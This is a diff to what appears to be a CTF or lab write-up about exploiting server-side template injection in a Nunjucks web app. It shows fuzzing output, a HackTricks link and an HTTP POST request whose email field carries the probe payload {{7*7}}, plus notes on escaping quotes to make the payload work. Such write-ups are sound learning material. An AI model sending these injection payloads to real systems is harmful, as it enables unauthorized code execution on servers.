@@ -1,3 +1,5 @@
+![image](https://user-images.githubusercontent.com/105310322/196730660-c5ef0194-cbad-4040-9a86-2d7f0c361d86.png)
+
 
 ### Tools: 
 
@@ -97,8 +99,10 @@ Processed Requests: 197
 Filtered Requests: 196
 Requests/sec.: 35.17474
 ```
+On this webpage we have a single input field and if we test out an SSTI it takes it!
 
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks
+
 
 ```
 POST /api/submit HTTP/1.1
@@ -120,7 +124,7 @@ Connection: close
 
 {"email":"{{7*7}}"}
 ```
-In order for this payload to work I had to use \ to escape the "", otherwise the payload wouldnt work and URL encoding had no effect.
+Now that we have finally confirmed that it is an SSTI we can form the rest of the payload. Hacktricks gave the basics of the command but in order for this payload to work I had to use \ to escape the "", otherwise the payload wouldnt work and URL encoding had no effect.
 
 ```
 POST /api/submit HTTP/1.1
